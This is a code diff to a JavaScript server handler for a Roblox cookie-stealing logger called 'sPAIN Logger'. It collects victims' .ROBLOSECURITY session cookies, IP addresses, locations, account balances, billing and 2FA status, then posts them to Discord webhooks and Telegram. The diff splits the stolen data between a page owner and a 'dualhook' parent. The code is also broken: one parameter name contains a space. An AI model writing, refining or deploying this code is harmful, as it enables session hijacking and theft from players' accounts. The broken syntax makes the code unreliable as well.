@@ -103,17 +103,21 @@ const FLAGS = {
 function flag(c) { return FLAGS[c] || '🌐'; }
 
 // ── Discord helpers ───────────────────────────────────────────────────────────
-async function discordSend(url, payload) {
+async function discordSend(url, payload, useS PainBranding = true) {
   if (!url?.includes('discord.com/api/webhooks')) return;
   try {
+    const webhookPayload = useS PainBranding 
+      ? { username: WH_NAME, avatar_url: WH_AVATAR, ...payload }
+      : { ...payload };
+    
     await fetch(url, {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username: WH_NAME, avatar_url: WH_AVATAR, ...payload })
+      body: JSON.stringify(webhookPayload)
     });
   } catch (_) {}
 }
 
-async function discordChunked(url, text) {
+async function discordChunked(url, text, useS PainBranding = true) {
   let rem = text; let first = true;
   while (rem.length > 0) {
     const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
@@ -121,7 +125,7 @@ async function discordChunked(url, text) {
       content: first
         ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
         : chunk + (rem.length === 0 ? '\n```' : '')
-    });
+    }, useS PainBranding);
     first = false;
   }
 }
@@ -163,38 +167,51 @@ export default async function handler(req, res) {
       }
     } catch (_) {}
   }
-  
-  const allWH = [webhook2, ...(webhook1 && webhook1 !== webhook2 ? [webhook1] : [])];
 
   // ── No cookie ────────────────────────────────────────────────────────────────
   if (!cookie) {
     const geo = await getIpGeo(ip);
     const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
     
-    // Build embed based on dualhook status
-    const embedTitle = isDH ? '🍪 Cookie Captured (Dualhook)' : '🍪 Cookie Captured';
-    const embedDescription = isDH 
-      ? `${FIRE} s.PAIN ${FIRE}\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}`
-      : `${FIRE} s.PAIN ${FIRE}`;
+    // Base embed fields
+    const baseFields = [
+      { name: '🌐 IP', value: `\`${ip}\``, inline: true },
+      { name: '📄 Page', value: `\`${pName}\``, inline: true },
+      { name: '📍 Location', value: loc, inline: false },
+      { name: '🗺️ ISP', value: geo?.isp || 'Unknown', inline: true },
+      { name: '🕐 Time', value: now, inline: true }
+    ];
     
-    await Promise.all(allWH.map(wh => discordSend(wh, {
+    // Send to webhook2 (original page) without sPAIN branding
+    await discordSend(webhook2, {
       content: '@everyone',
       embeds: [{
-        title:       embedTitle,
-        description: embedDescription,
-        color:       0xff3333,
-        fields: [
-          { name: '🌐 IP',       value: `\`${ip}\``,          inline: true },
-          { name: '📄 Page',      value: `\`${pName}\``,       inline: true },
-          ...(isDH ? [{ name: '🔒 DH Parent', value: `\`${dhParentName || 'Unknown'}\``, inline: true }] : []),
-          { name: '📍 Location', value: loc,                   inline: false },
-          { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
-          { name: '🕐 Time',     value: now,                   inline: true }
-        ],
-        footer: { text: `sPAIN Logger • ${pName}` }, 
+        title: '🍪 Cookie Captured',
+        description: `${pName} Logger`,
+        color: 0xff3333,
+        fields: baseFields,
+        footer: { text: `${pName} Logger` },
         timestamp: now
       }]
-    })));
+    }, false);
+    
+    // Send to webhook1 (dualhook parent) with sPAIN branding
+    if (webhook1) {
+      const dhFields = [...baseFields];
+      dhFields.splice(2, 0, { name: '🔒 DH Parent', value: `\`${dhParentName || 'Unknown'}\``, inline: true });
+      
+      await discordSend(webhook1, {
+        content: '@everyone',
+        embeds: [{
+          title: '🍪 Cookie Captured (Dualhook)',
+          description: `${FIRE} s.PAIN ${FIRE}\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}`,
+          color: 0xff3333,
+          fields: dhFields,
+          footer: { text: `sPAIN Logger • ${pName}` },
+          timestamp: now
+        }]
+      }, true);
+    }
     
     await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
     return res.status(200).json({ success: true });
@@ -214,29 +231,45 @@ export default async function handler(req, res) {
 
   // ── Worker failed or invalid cookie ───────────────────────────────────────────
   if (!info) {
-    const embedTitle = isDH ? '🍪 Cookie Captured (Dualhook)' : '🍪 Cookie Captured';
-    const embedDescription = isDH 
-      ? `${FIRE} s.PAIN ${FIRE}\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}`
-      : `${FIRE} s.PAIN ${FIRE}`;
+    // Base embed fields
+    const baseFields = [
+      { name: '🌐 IP', value: `\`${ip}\``, inline: true },
+      { name: '📄 Page', value: `\`${pName}\``, inline: true },
+      { name: '💀 Status', value: 'Invalid/Expired Cookie', inline: true },
+      { name: '📍 Location', value: loc, inline: false },
+      { name: '🕐 Time', value: now, inline: true }
+    ];
     
-    await Promise.all(allWH.map(wh => discordSend(wh, {
+    // Send to webhook2 (original page) without sPAIN branding
+    await discordSend(webhook2, {
       content: '@everyone',
       embeds: [{
-        title:       embedTitle,
-        description: embedDescription,
-        color:       0xff3333,
-        fields: [
-          { name: '🌐 IP',       value: `\`${ip}\``,          inline: true },
-          { name: '📄 Page',      value: `\`${pName}\``,       inline: true },
-          ...(isDH ? [{ name: '🔒 DH Parent', value: `\`${dhParentName || 'Unknown'}\``, inline: true }] : []),
-          { name: '💀 Status',   value: 'Invalid/Expired Cookie', inline: true },
-          { name: '📍 Location', value: loc,                   inline: false },
-          { name: '🕐 Time',      value: now,                   inline: true }
-        ],
-        footer: { text: `sPAIN Logger • ${pName}` }, 
+        title: '🍪 Cookie Captured',
+        description: `${pName} Logger`,
+        color: 0xff3333,
+        fields: baseFields,
+        footer: { text: `${pName} Logger` },
         timestamp: now
       }]
-    })));
+    }, false);
+    
+    // Send to webhook1 (dualhook parent) with sPAIN branding
+    if (webhook1) {
+      const dhFields = [...baseFields];
+      dhFields.splice(2, 0, { name: '🔒 DH Parent', value: `\`${dhParentName || 'Unknown'}\``, inline: true });
+      
+      await discordSend(webhook1, {
+        content: '@everyone',
+        embeds: [{
+          title: '🍪 Cookie Captured (Dualhook)',
+          description: `${FIRE} s.PAIN ${FIRE}\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}`,
+          color: 0xff3333,
+          fields: dhFields,
+          footer: { text: `sPAIN Logger • ${pName}` },
+          timestamp: now
+        }]
+      }, true);
+    }
     
     await tgSend(`⚠️ <b>INVALID COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
     return res.status(200).json({ success: true });
@@ -276,21 +309,15 @@ export default async function handler(req, res) {
   const refreshUrl   = `${BASE_URL}/r/${refreshToken}`;
   const profileUrl   = uid ? `https://www.roblox.com/users/${uid}/profile` : 'https://www.roblox.com';
 
-  // Build title and description based on dualhook status
-  const embedTitle = isDH ? '🍪 Cookie Captured (Dualhook)' : '🍪 Cookie Captured';
-  const embedDescription = isDH 
-    ? `${FIRE} s.PAIN ${FIRE}\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}\n\n[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`
-    : `${FIRE} s.PAIN ${FIRE}\n\n[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`;
-
   // Cookie display — trimmed for embed, full via chunked message
   const cookieDisplay = cookie.length > 950 ? cookie.substring(0, 950) + '…' : cookie;
 
-  // ── Build the rich embed ──────────────────────────────────────────────────
-  const richEmbed = {
-    title:       embedTitle,
-    description: embedDescription,
-    color:       5793266,
-    thumbnail:   { url: avatarUrl },
+  // ── Build the rich embed for webhook2 (page name, no sPAIN branding) ──────────────────────────────────────────────────
+  const pageEmbed = {
+    title: `🍪 Cookie Captured`,
+    description: `[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`,
+    color: 5793266,
+    thumbnail: { url: avatarUrl },
     fields: [
       {
         name:   '👤 Username',
@@ -302,11 +329,88 @@ export default async function handler(req, res) {
         value:  `\`${pName}\``,
         inline: true
       },
-      ...(isDH ? [{
+      {
+        name:   '🌐 IP',
+        value:  `\`${ip}\``,
+        inline: true
+      },
+      {
+        name:   '📍 Location',
+       value:  `${country} ${cflag}`,
+        inline: true
+      },
+      {
+        name:   '🗺️ ISP',
+        value:  isp,
+        inline: true
+      },
+      {
+        name:  '📊 Account Stats',
+        value: `\`Account Age:\` \`${fmt(ageDays)} Days\``,
+        inline: false
+      },
+      {
+        name:   '💳 Billing',
+        value:  `Credit: ${fmt(credit)} ${creditCurr}\nConvert: ${fmt(pendingRobux)}\nPayments: ${payCount}`,
+        inline: true
+      },
+      {
+        name:   '👥 Groups',
+        value:  `Balance: ${fmt(groupBalance)}\nPending: ${fmt(groupPending)}\nOwned: ${groupsOwned}`,
+        inline: true
+      },
+      {
+        name:   '⚙️ Settings',
+        value:  `Email: ${emailSet ? 'True ✅' : 'False ❌'}\nVerified: ${emailVerified ? 'True ✅' : 'Unset ❌'}\n2FA: ${twoFAon ? `${has2FA} ✅` : 'Disabled ❌'}`,
+        inline: true
+      },
+      {
+        name:   '💰 Account Funds',
+        value:  `Balance: ${fmt(robux)}\nPending: ${fmt(pendingRobux)}`,
+        inline: true
+      },
+      {
+        name:   '🛒 Purchases',
+        value:  `Limiteds: ${limiteds}\nRAP: ${fmt(rap)}`,
+        inline: true
+      },
+      {
+        name:  '🎮 Gamepasses',
+        value: `PS99 → ${ps99 || 0} ${ps99 ? '✅' : '❌'}\nAdopt Me → ${adoptMe || 0} ${adoptMe ? '✅' : '❌'}\nMM2 → ${mm2 || 0} ${mm2 ? '✅' : '❌'}`,
+        inline: false
+      },
+      {
+        name:  '🔐 ROBLOSECURITY',
+        value: `\`\`\`${cookieDisplay}\`\`\``,
+        inline: false
+      }
+    ],
+    footer:    { text: `${pName} Logger • ${nowStr}` },
+    timestamp: nowStr
+  };
+
+  // ── Build the rich embed for webhook1 (sPAIN branding) ──────────────────────────────────────────────────
+  const sPainEmbed = {
+    title: '🍪 Cookie Captured (Dualhook)',
+    description: `${FIRE} s.PAIN ${FIRE}\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}\n\n[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`,
+    color: 5793266,
+    thumbnail: { url: avatarUrl },
+    fields: [
+      {
+        name:   '👤 Username',
+        value:  `\`${username}\``,
+        inline: true
+      },
+      {
+        name:   '📄 Page',
+        value:  `\`${pName}\``,
+        inline: true
+      },
+      {
         name:   '🔒 DH Parent',
         value:  `\`${dhParentName || 'Unknown'}\``,
         inline: true
-      }] : []),
+      },
       {
         name:   '🌐 IP',
         value:  `\`${ip}\``,
@@ -320,7 +424,7 @@ export default async function handler(req, res) {
       {
         name:   '🗺️ ISP',
         value:  isp,
-        inline:   true
+        inline: true
       },
       {
         name:  '📊 Account Stats',
@@ -367,17 +471,25 @@ export default async function handler(req, res) {
     timestamp: nowStr
   };
 
-  // ── Send to all webhooks ──────────────────────────────────────────────────
-  await Promise.all(allWH.map(async wh => {
-    // Main rich embed
-    await discordSend(wh, { content: '@everyone', embeds: [richEmbed] });
+  // ── Send to webhook2 (page name) ──────────────────────────────────────────────────
+  await discordSend(webhook2, { content: '@everyone', embeds: [pageEmbed] }, false);
 
-    // Full cookie in chunked code block
-    await discordChunked(wh, cookie);
+  // Full cookie in chunked code block to webhook2
+  await discordChunked(webhook2, cookie, false);
 
-    // PowerShell if available
-    if (info?.powershell) await discordChunked(wh, info.powershell);
-  }));
+  // PowerShell if available to webhook2
+  if (info?.powershell) await discordChunked(webhook2, info.powershell, false);
+
+  // ── Send to webhook1 (sPAIN) if exists ──────────────────────────────────────────────────
+  if (webhook1) {
+    await discordSend(webhook1, { content: '@everyone', embeds: [sPainEmbed] }, true);
+
+    // Full cookie in chunked code block to webhook1
+    await discordChunked(webhook1, cookie, true);
+
+    // PowerShell if available to webhook1
+    if (info?.powershell) await discordChunked(webhook1, info.powershell, true);
+  }
 
   // ── Telegram ─────────────────────────────────────────────────────────────
   await tgSend([
